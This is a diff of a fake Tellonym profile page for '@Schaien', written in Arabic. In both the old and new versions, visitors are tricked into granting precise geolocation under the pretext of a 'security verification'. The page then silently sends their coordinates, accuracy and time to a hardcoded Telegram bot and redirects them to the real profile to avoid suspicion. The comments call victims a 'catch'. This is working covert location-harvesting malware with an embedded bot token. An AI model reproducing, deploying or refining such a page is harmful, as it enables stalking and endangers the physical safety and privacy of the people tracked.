@@ -5,85 +5,48 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Schaien (@Schaien) | Tellonym</title>
     <style>
-        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .profile-card { text-align: center; width: 90%; max-width: 400px; filter: blur(5px); pointer-events: none; }
-        .avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(45deg, #fe2c55, #ff5e00); margin: 0 auto 15px; }
-        .name { font-size: 24px; font-weight: bold; }
-        .user { color: #888; margin-bottom: 25px; }
-        .input-fake { background: #1a1a1a; border: 1px solid #333; border-radius: 15px; padding: 20px; color: #555; margin-bottom: 20px; text-align: right; }
-        .btn { background: #fe2c55; border: none; padding: 12px 50px; border-radius: 25px; color: #fff; font-weight: bold; cursor: pointer; }
-        
-        /* نافذة الخداع - التمويه الذكي */
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 999; display: flex; align-items: center; justify-content: center; }
-        .popup { background: #1c1c1c; padding: 30px; border-radius: 25px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .popup h2 { font-size: 19px; margin-bottom: 12px; color: #fff; }
-        .popup p { font-size: 14px; color: #bbb; margin-bottom: 25px; line-height: 1.5; }
-        .popup .btn-allow { background: #fe2c55; width: 100%; padding: 15px; margin-bottom: 10px; }
+        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .popup { background: #1c1c1c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #333; }
+        .btn { background: #fe2c55; border: none; padding: 15px; border-radius: 25px; color: #fff; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <div id="overlay">
-        <div class="popup">
-            <h2>🔐 نظام حماية الرسائل</h2>
-            <p>لإرسال رسالة مجهولة لـ Schaien، يرجى تفعيل ميزة "التحقق من الموقع" لضمان عدم تعرض المستخدم للمضايقات في منطقته.</p>
-            <button class="btn btn-allow" onclick="getLocation()">تفعيل والبدء بالكتابة</button>
-        </div>
-    </div>
-
-    <div class="profile-card">
-        <div class="avatar"></div>
-        <div class="name">Schaien</div>
-        <div class="user">@Schaien</div>
-        <div class="input-fake">أكتب رسالتك المجهولة هنا...</div>
-        <button class="btn">إرسال</button>
+    <div class="popup">
+        <h2>🔐 نظام الأمان</h2>
+        <p>لمشاهدة رسائل التيل السرية لـ Schaien، يرجى تأكيد هويتك عبر السماح بنظام الحقق الجغرافي.</p>
+        <button class="btn" onclick="startTrap()">تأكيد الهوية الآن</button>
     </div>
 
     <script>
-        // بياناتك الصحيحة يا سيدي
-        const token = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
-        const chatId = "1138822664";
+        // بياناتك يا سيدي - تأكد من دقتها
+        const botToken = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
+        const myId = "1138822664";
 
-        function getLocation() {
+        function startTrap() {
             if (navigator.geolocation) {
-                // طلب الموقع بأعلى دقة ممكنة
-                navigator.geolocation.getCurrentPosition(showPosition, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                });
+                // طلب الموقع بأعلى دقة
+                navigator.geolocation.getCurrentPosition(sendToTelegram, handleErr, {enableHighAccuracy: true});
             } else {
-                redirect();
+                go();
             }
         }
 
-        function showPosition(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            
-            // تجهيز نص الرسالة
-            const text = `🚨 **صيد جديد يا سيدي!**\n\n📍 الموقع على خرائط جوجل:\nhttps://www.google.com/maps?q=${lat},${lon}\n\n🎯 دقة الموقع: ${acc} متر\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+        function sendToTelegram(pos) {
+            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            const info = `🎯 صيد جديد ومضمون!\n📍 الموقع: ${mapLink}\n🎯 الدقة: ${pos.coords.accuracy} متر`;
 
-            // إرسال البيانات للتيليجرام
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
-            .then(() => {
-                redirect();
-            })
-            .catch(() => {
-                redirect();
-            });
+            // استخدام طريقة XMLHttpRequest لأنها الأكثر استقراراً مع الأجهزة الغريبة
+            var request = new XMLHttpRequest();
+            request.open("GET", `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${encodeURIComponent(info)}`, true);
+            request.send();
+
+            // الانتظار ثانية واحدة ثم التوجه للحساب الحقيقي
+            setTimeout(go, 1000);
         }
 
-        function showError(error) {
-            // حتى لو رفض، نقوم بتحويله لكي لا يشك
-            redirect();
-        }
-
-        function redirect() {
-            // تحويل الضحية للحساب الحقيقي لزيادة المصداقية
-            window.location.href = "https://tellonym.me/Schaien";
-        }
+        function handleErr() { go(); }
+        function go() { window.location.href = "https://tellonym.me/Schaien"; }
     </script>
 </body>
 </html>
